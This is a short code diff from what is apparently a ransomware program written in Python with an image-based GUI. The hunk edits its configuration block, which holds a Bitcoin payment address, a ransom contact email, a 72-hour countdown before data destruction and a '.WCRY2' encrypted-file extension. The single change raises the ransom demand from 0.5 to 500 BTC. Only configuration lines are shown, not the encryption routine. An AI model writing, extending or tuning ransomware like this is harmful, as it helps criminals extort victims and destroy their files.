@@ -31,7 +31,7 @@ from PIL import Image, ImageTk
 
 # ==================== CONFIGURATION ====================
 BITCOIN_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
-PAYMENT_AMOUNT = 0.5  # BTC
+PAYMENT_AMOUNT = 500  # BTC
 EMAIL_CONTACT = "ransomwaredecryption@onionmail.org"
 DESTROY_TIMER = 72  # Hours before destruction
 ENCRYPTION_EXTENSION = ".WCRY2"
